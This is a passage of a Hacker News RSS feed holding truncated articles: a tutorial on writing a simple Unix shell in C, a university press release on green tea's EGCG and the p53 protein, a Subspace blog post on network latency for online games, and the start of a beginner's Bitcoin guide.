walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you’re
a student in such a class, you shouldn’t copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let’s look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell’s behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we’re
going to use them for the basis for our shell.  Our shell will be so simple that
there won’t be any configuration files, and there won’t be any shutdown command.
So, we’ll just call the looping function and then terminate.  But in terms of
architecture, it’s important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We’ll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we’ve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I’ll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let’s walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we’re using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don’t know ahead of time how much text a user will enter
into their shell.  You can’t simply allocate a block and hope they don’t exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we’ll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn’t noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that’s
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it’s the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that’s really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn’t know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I’m leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You’d be robbing yourself of a
learning opportunity if you didn’t!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we’ve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I’m going to make a glaring simplification here,
and say that we won’t allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is “tokenize” the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it’s because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we’re doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we’re really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what’s going on with processes and how they start.  That’s why I’m going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn’t count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren’t Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the “guardian of the genome” for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=Y2UwZDc2NDgwY2VhOWIwZjE2MTQzYjg2NzgwMDdhZTcwM2RhZDgxNSxlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613464462"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>“Both p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,” said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. “Now we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53’s anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.”</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer’s disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as “arguably the most important protein in human cancer.”</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death — called apoptosis — if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang’s team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>“Both EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,” said Wang. “When EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.”</p><p>“By developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer’s disease, Chunyu’s research is laying the groundwork for new and successful therapies,” said Curt Breneman, dean of the Rensselaer School of Science.</p><p>–</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;“EGCG binds intrinsically disordered N-terminal domain of p53 and disrupts p53-MDM2 interaction”, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Internet Today Isn’t Built for the Billions of Gamers of Tomorrow]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26124917">thread link</a>) | @quentusrex
<br/>
February 13, 2021 | https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4b4cde9dbdbb9767ad24"><div><p>The 2020 pandemic exposed a fundamental flaw in the way the Internet is built.</p><p>Online games were blamed for clogged networks and slowed speeds, but in reality, the Internet is structurally broken when it comes to real-time interactivity. You’ve heard the line:</p><p><strong><em>Kids, get off your consoles; I’m on a video call!</em></strong></p><p>It’s 4 PM on Wednesday. You’re on an important Zoom call and right in the middle of presenting when your face freezes. Those on the call can only catch half of what you say and are left staring at an unflattering image of you mid-word.</p><h3><strong>How We Got Here: The Evolving Internet</strong></h3><p>The Internet is built for the reliable delivery of content, such as e-mail and file transfers, but not built for performance. Border Gateway Protocol (BGP)— the standardized routing protocol for the Internet—has no idea what traffic it is routing or in which direction it is sending data. It simply routes data using the cheapest path possible depending on various factors, including politics, commercial agreements, and cost. As a result, certain types of data, namely real-time communications, suffer as the Internet favors servicing volumetric traffic.</p><p>At the start of the millennium, content delivery networks employed global networks of servers to deliver static content faster, leading the way to make OTT (Over-the-top, services offered over the top of traditional content distributors) possible with the infrastructure built by companies such as Netflix, YouTube, and Akamai. More recently, companies like Amazon Web Services have democratized cloud computing, bringing connectivity to more users in more regions of the world. The next evolution of the Internet should be one in which the network itself is democratized, enabling speed-of-light communication for the applications that require high-velocity delivery, such as real-time communications. This means delivering voice over internet protocol calls (VoIP, e.g., Skype, Clubhouse), online multiplayer video games, and more, regardless of the compute or data server owner.</p><h3><strong>Complex Issues with a Complex Network</strong></h3><p>The Internet is a complicated web of networks and billions of computers and devices that connect to each other and work together to send and receive information. The greater the distance between the sending and receiving computers, the longer it takes the data to arrive at its destination. Information can also take different paths, which may increase or decrease the speed of delivery.</p><p>A common analogy used to explain the way the Internet works is the postal service. In the same way that your letter travels from you to the recipient through multiple facilities (carrier, sorting, post office), data travels through numerous routers on its way to the recipient computer. Just as your letter can arrive faster depending on which mail service you use, so too can data transmit faster depending on which path it takes, though the distance between the sender and receiver has the most influence on travel time.</p><p>There are a couple of significant differences in this analogy, however.</p><p><em>One, there are generally more “stops” along the way for data, and two, the data is broken up into multiple smaller “packets” of information rather than sent as one whole mail piece.</em></p><p>Because there are different paths along which individual packets of information can travel, each entailing a variable number of stops along the way, packets of data can easily get lost.</p><p><strong>Packet loss</strong>, as it’s called, results in missing information and a degraded user experience. In a Skype call, packet loss is experienced as gaps in audio. In video games, packet loss results in strange behavior like teleportation, in which a game freezes, then suddenly moves a player’s character to another place when the game resumes.</p><p>Another result of these inconsistent, differing routes is variation in delivery time. Some routes are faster than others, so some packets may arrive more quickly than others since the Internet is not conscious of which path it takes in sending data from one point to another. This variation in the time it takes for data to travel across the network from one endpoint to another is called <strong>latency</strong>, and the result of latency is <strong>jitter</strong>. On a Skype call, jitter manifests as jumbled speech that creates an indecipherable conversation. In video games, jitter manifests in behavior like errant shots, in which a player’s aim may be correct, but the shot doesn’t register in time to hit the target where they are.</p><p>While <strong>lag</strong> (high levels of latency), jitter, and packet loss may impact any online service or application, certain applications depend upon real-time packet delivery and minimal jitter and packet loss to function correctly and maintain a reasonable quality of experience. Packet delivery, consistent latency, and minimal lag are critical for services and applications like VoIP and online gaming and in numerous other industries such as high-frequency trading, telemedicine, and the Internet of Things.</p><p>For these applications, milliseconds saved in delivering data can lead to a real or virtual life-and-death situation and mean the difference between winning and losing millions of dollars or between a quality and a subpar gaming experience.</p><h3><strong>How Subspace Improves Real-Time Application Delivery</strong></h3><p>A millisecond’s delay in delivery does not matter in sending an email or a text message, but it does matter in real-time communications. So why should these applications travel on the same network, in the same way?</p><p>Subspace’s vision is to create an Internet byway through which latency-critical web traffic such as video games, VoIP, and video conferencing can consistently pass through at the speed of light. Like Waze for the Internet, Subspace gives the Internet a GPS of sorts, finding the absolute fastest and most secure and consistent path for real-time data to travel from endpoint to endpoint. As a result, latency and lag are reduced, and real-time applications reach their full potential.</p><p>While other companies have attempted to provide solutions for expediting real-time communications on the Internet, none have addressed the issue across the entire system. Many introduce other issues in their attempts. Commercial networking solutions like Cisco and Juniper were not built for global coordination or to understand and control game traffic. Standalone solutions that require SDKs installed in clients and servers can create significant security and stability risks. And services provided by CDNs like Cloudflare and Akamai utilize the same principles and infrastructure as their primary businesses—that is, volumetric traffic—making the possibility of optimizing real-time traffic at scale a costly and difficult endeavor.&nbsp;</p><p>In the case of video games, lag, packet loss, and jitter are such a concern that some game companies have endeavored to build their own custom solutions. This “do it yourself” approach requires massive internal coordination, investment, and attention, which many publishers cannot afford to prioritize. And still, a DIY approach limits the publisher to its existing commercial relationships and capabilities.</p><p>Subspace’s platform optimizes every component of network performance, from the infrastructure stack to the networking stack, including software and hardware, the control plane, and the data plane. With a global Internet architected specifically for real-time traffic at every point, we are achieving speed-of-light communication and democratizing the network. Regardless of the data’s location, Subspace uses a vast system of Internet quality metrics and a proprietary algorithm to direct real-time interactive traffic onto our platform and across the public and our private Internet to and from servers. The algorithm can balance multiple variables to suit each application’s needs—variables such as absolute latency, any latency above a threshold, jitter &amp; loss. The optimal delivery platform via the Subspace onramp drives better, more consistent experiences that match each application’s needs.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_35285"><div><p>We start with purpose-built points of presence (PoPs), deploying our hardware in data centers worldwide. Each PoP is capable of handling millions of servers, millions of simultaneous user sessions, and enough capacity for all of the user traffic while also providing room for absorbing DDOS attacks, with the expectation that traffic by its nature is mostly small UDP packets.</p><p>The PoPs are distributed globally and specifically network-engineered to reduce the distance needed for players to reach our onramp, minimizing the risk of congestion and misrouting. Players are given a Subspace IP and UDP port as a proxy for a server.</p><p>The Subspace PoP uses a proprietary algorithm to determine the optimal path through our private network before ultimately reaching the game server and back. We do this both ways, packets can take a different route back from the server if Subspace finds a better path for the application needs, another differentiator to CDNs, which are optimized for one-way traffic. Continuous telemetry measures the latency, jitter, and loss between Subspace PoPs, feeding into an algorithm that determines the optimum route between the edge and application servers. On the network’s server-side, we have PoPs directly connected with major providers to minimize latency and lag upon exiting our network.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_41155"><div><p>Subspace’s global network, which has already launched in multiple regions and is being aggressively deployed towards a global optimized network, already supports some of the world’s most popular online games. And it’s not just about performance. The Subspace platform leverages all of these PoPs to provide a tremendous platform for stopping DDoS attacks against application servers at the edge, before bot networks can aggregate into attacks that get too big to handle or have to be sent off to latency-inducing scrubbing centers. Troublesome attack vectors, replay attacks, and other volumetric attacks can be easily stopped at the Subspace edge, while the game server infrastructure remains protected …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124917</guid>
            <pubDate>Sat, 13 Feb 2021 17:22:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner’s Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 82 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the “original” cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ― but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of “digital money” that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ― with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a 